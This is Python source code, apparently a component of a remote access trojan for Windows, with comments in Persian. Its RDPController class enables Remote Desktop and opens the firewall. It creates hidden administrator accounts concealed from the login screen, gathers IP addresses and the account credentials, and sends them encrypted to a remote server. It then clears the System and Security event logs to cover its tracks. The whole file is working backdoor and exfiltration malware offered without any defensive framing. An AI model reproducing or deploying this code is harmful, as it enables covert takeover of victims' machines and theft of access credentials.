import subprocess
import winreg
import logging
import requests
import socket
import uuid
import os
from config import Config
from encryption.manager import EncryptionManager
import json
from subprocess import run, PIPE
from typing import Dict, Optional

class RDPController:
    def __init__(self, encryption_manager: EncryptionManager):
        self.encryption = encryption_manager
        self.username = f"rat_admin_{uuid.uuid4().hex[:8]}"  # نام کاربری تصادفی
        self.password = uuid.uuid4().hex  # رمز عبور تصادفی
        if Config.DEBUG_MODE:
            logging.info("RDPController initialized")

    def enable_rdp(self) -> Dict[str, str]:
        """
        Enable Remote Desktop Protocol (RDP) and create a hidden user for access.
        Returns a dictionary with status and details.
        """
        try:
            # Enable RDP in registry
            logging.info("Attempting to enable RDP in registry...")
            reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
                logging.info("RDP enabled in registry")
            except Exception as e:
                logging.error(f"Failed to enable RDP in registry: {e}")
                raise
            
            # Allow RDP through Windows Firewall
            logging.info("Configuring firewall for RDP...")
            try:
                run(["netsh", "advfirewall", "firewall", "set", "rule", "group=\"remote desktop\"", "new", "enable=Yes"], check=True)
                logging.info("Firewall configured for RDP")
            except Exception as e:
                logging.error(f"Failed to configure firewall: {e}")
                raise
            
            # Create hidden user for RDP access
            username = "HiddenRDPUser"
            password = os.urandom(16).hex()  # Generate random password
            logging.info(f"Creating hidden user: {username}...")
            try:
                run(["net", "user", username, password, "/add"], check=True)
                run(["net", "localgroup", "Administrators", username, "/add"], check=True)
                run(["net", "user", username, "/active:yes"], check=True)
                logging.info(f"Hidden user {username} created and added to Administrators")
            except Exception as e:
                logging.error(f"Failed to create user {username}: {e}")
                raise
            
            # Hide user from login screen
            logging.info("Hiding user from login screen...")
            reg_path_user = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
            try:
                with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path_user) as key:
                    winreg.SetValueEx(key, username, 0, winreg.REG_DWORD, 0)
                logging.info(f"User {username} hidden from login screen")
            except Exception as e:
                logging.warning(f"Failed to hide user {username}: {e}")
    
            # Get IP addresses
            logging.info("Collecting IP addresses...")
            try:
                local_ip = run(["ipconfig"], capture_output=True, text=True).stdout
                public_ip = run(["curl", "ifconfig.me"], capture_output=True, text=True).stdout.strip()
                logging.info("IP addresses collected")
            except Exception as e:
                logging.error(f"Failed to collect IP addresses: {e}")
                raise
            
            rdp_info = {
                "client_id": os.environ.get("CLIENT_ID", "unknown"),
                "local_ip": local_ip,
                "public_ip": public_ip,
                "username": username,
                "password": password
            }
    
            logging.info("Encrypting RDP info...")
            encrypted_info = self.encryption.encrypt(json.dumps(rdp_info))
            logging.info("RDP enabled successfully")
            return {"status": "success", "rdp_info": encrypted_info}
    
        except Exception as e:
            logging.error(f"Failed to enable RDP: {e}")
            return {"status": "error", "message": str(e)}
    
    def disable_rdp(self) -> Dict[str, str]:
        """
        Disable Remote Desktop Protocol (RDP) and remove hidden user.
        Returns a dictionary with status and details.
        """
        try:
            # Disable RDP in registry
            reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)

            # Block RDP through Windows Firewall
            run(["netsh", "advfirewall", "firewall", "set", "rule", "group=\"remote desktop\"", "new", "enable=No"], check=True)

            # Remove hidden user
            username = "HiddenRDPUser"
            run(["net", "user", username, "/delete"], check=True, stderr=PIPE)

            logging.info("RDP disabled successfully")
            return {"status": "success", "message": "RDP disabled and user removed"}

        except Exception as e:
            logging.error(f"Failed to disable RDP: {e}")
            return {"status": "error", "message": str(e)}

    def create_hidden_user(self):
        """
        ایجاد حساب کاربری مخفی با دسترسی ادمین.
        """
        try:
            # ایجاد حساب کاربری
            cmd = f'net user {self.username} {self.password} /add'
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)

            # اضافه کردن به گروه ادمین
            cmd = f'net localgroup Administrators {self.username} /add'
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)

            # مخفی کردن حساب از صفحه لاگین
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
            try:
                with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                    winreg.SetValueEx(key, self.username, 0, winreg.REG_DWORD, 0)
            except:
                pass  # ممکنه کلید وجود داشته باشه

            if Config.DEBUG_MODE:
                logging.info(f"Created hidden user: {self.username}")
            return True
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to create hidden user: {str(e)}")
            return False

    def get_connection_info(self):
        """
        جمع‌آوری اطلاعات اتصال (IP، نام کاربری، رمز عبور).
        """
        try:
            # دریافت IP محلی
            local_ip = socket.gethostbyname(socket.gethostname())

            # دریافت IP عمومی
            public_ip = ""
            try:
                response = requests.get("https://api.ipify.org", timeout=5)
                if response.status_code == 200:
                    public_ip = response.text
            except:
                pass

            info = {
                "local_ip": local_ip,
                "public_ip": public_ip,
                "username": self.username,
                "password": self.password,
                "client_id": Config.get_client_id()
            }
            if Config.DEBUG_MODE:
                logging.info(f"Connection info: {info}")
            return info
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Failed to get connection info: {str(e)}")
            return None

    def send_to_server(self, info):
        """
        ارسال اطلاعات RDP به سرور.
        """
        try:
            encrypted_info = self.encryption.encrypt(json.dumps(info))
            payload = {
                "action": "report_rdp",
                "client_id": info["client_id"],
                "rdp_info": encrypted_info,
                "token": Config.SECRET_TOKEN
            }
            headers = {"X-Secret-Token": Config.SECRET_TOKEN}
            response = requests.post(Config.SERVER_URL, json=payload, headers=headers, timeout=10)
            if response.status_code == 200:
                if Config.DEBUG_MODE:
                    logging.info("RDP info sent to server")
                return True
            else:
                if Config.DEBUG_MODE:
                    logging.error(f"Failed to send to server: {response.text}")
                return False
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Server send error: {str(e)}")
            return False

    def cleanup_logs(self):
        """
        پاک‌سازی لاگ‌های سیستمی برای مخفی‌کاری.
        """
        try:
            cmd = 'wevtutil cl System'
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            cmd = 'wevtutil cl Security'
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if Config.DEBUG_MODE:
                logging.info("System logs cleaned")
            return True
        except Exception as e:
            if Config.DEBUG_MODE:
                logging.error(f"Log cleanup error: {str(e)}")
            return False

    def start(self):
        """
        شروع فرآیند فعال‌سازی و ارسال اطلاعات RDP.
        """
        try:
            if not self.enable_rdp():
                logging.error("RDP setup failed: Could not enable RDP")
                return False
            logging.info("RDP enabled successfully")

            if not self.create_hidden_user():
                logging.error("RDP setup failed: Could not create hidden user")
                return False
            logging.info(f"Hidden user created: {self.username}")

            info = self.get_connection_info()
            if not info:
                logging.error("RDP setup failed: Could not get connection info")
                return False
            logging.info(f"Connection info collected: {info}")

            if not self.send_to_server(info):
                logging.error("RDP setup failed: Could not send info to server")
                return False
            logging.info("RDP info sent to server")

            if not self.cleanup_logs():
                logging.warning("Log cleanup failed, but RDP setup completed")
            else:
                logging.info("System logs cleaned")

            logging.info("RDP setup completed successfully")
            return True
        except Exception as e:
            logging.error(f"RDP setup error: {str(e)}")
            return False